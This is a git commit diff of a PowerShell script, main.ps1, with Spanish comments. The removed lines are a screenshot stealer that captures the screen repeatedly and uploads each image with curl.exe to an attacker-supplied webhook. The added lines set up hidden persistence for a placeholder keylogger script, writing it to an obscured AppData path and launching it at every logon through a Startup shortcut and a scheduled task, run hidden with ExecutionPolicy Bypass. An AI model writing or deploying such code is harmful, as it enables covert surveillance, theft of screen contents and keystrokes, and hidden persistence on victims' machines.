933a4bb8e0c3f27f3ea8573be634a8d1b48504d2
Gerper90 <43889986+Gerper90@users.noreply.github.com>
2024-02-08 08:08:29 -0500

    main.ps1

--- main.ps1
+++ main.ps1
@@ -1,30 +1,28 @@
-$hookurl = "$dc"
-$seconds = 30 # Intervalo de captura de pantalla
-$a = 2 # Cantidad de capturas de pantalla
+# Ruta predeterminada donde se guardará el script
+$ScriptDirectory = "$env:USERPROFILE\Documents\.\." + [char]92 + "AppData" + [char]92 + "Local" + [char]92 + "Temp" + [char]92 + "Data"
 
-# Detección de URL acortada
-if ($hookurl.Ln -ne 121) {
-    Write-Host "¡Se detectó una URL de webhook acortada!"
-    $hookurl = (irm $hookurl).url
+# Crear el directorio si no existe
+if (-not (Test-Path -Path $ScriptDirectory -PathType Container)) {
+    New-Item -Path $ScriptDirectory -ItemType Directory
 }
 
-While ($a -gt 0) {
-    $Filett = "$env:temp\SC.png"
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-type -AssemblyName System.Drawing
-    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-    $Width = $Screen.Width
-    $Height = $Screen.Height
-    $Left = $Screen.Left
-    $Top = $Screen.Top
-    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
-    Start-Sleep 1
-    curl.exe -F "file1=@$Filett" $hookurl
-    Start-Sleep 1
-    Remove-Item -Path $Filett
-    Start-Sleep $seconds
-    $a
-}
+# Guardar el script de detección de pulsaciones de teclas en la ruta predeterminada
+$ScriptPath = Join-Path -Path $ScriptDirectory -ChildPath "keystroke_script.ps1"
+@"
+# Aquí va tu script de detección de pulsaciones de teclas
+"@ | Set-Content -Path $ScriptPath
+
+# Ruta del acceso directo en la carpeta de inicio de Windows
+$ShortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\keystroke_script.lnk"
+
+# Crear acceso directo para ejecutar el script de detección de pulsaciones de teclas al iniciar sesión
+$Shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut($ShortcutPath)
+$Shortcut.TargetPath = "powershell.exe"
+$Shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$ScriptPath"""
+$Shortcut.Save()
+
+# Agregar el script de detección de pulsaciones de teclas a la tarea de inicio programado para ejecutarlo al iniciar Windows
+$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$ScriptPath"""
+$TaskTrigger = New-ScheduledTaskTrigger -AtLogon
+$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+Register-ScheduledTask -TaskName "EjecutarScriptAlInicio" -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -Description "Ejecuta el script de detección de pulsaciones de teclas al iniciar sesión en Windows."
